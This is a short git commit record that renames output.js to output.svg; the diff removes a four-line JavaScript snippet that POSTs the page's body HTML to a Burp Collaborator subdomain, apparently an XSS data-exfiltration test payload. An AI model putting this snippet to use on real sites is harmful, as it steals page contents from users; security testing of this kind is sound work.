5b5ec6d34a2b0fe5f029eb8a34c1c09efa5f452f
Cameron Brown <cb12389@gmail.com>
2020-04-11 21:38:43 -0500

    Update and rename output.js to output.svg

--- output.js
+++
@@ -1,4 +0,0 @@
-(function(){var xhttp = new XMLHttpRequest();
-xhttp.open("POST", "http://615kiqynat73wnqtupttlc8h086yun.burpcollaborator.net/", true);
-var data = document.body.innerHTML;
-xhttp.send(data);})
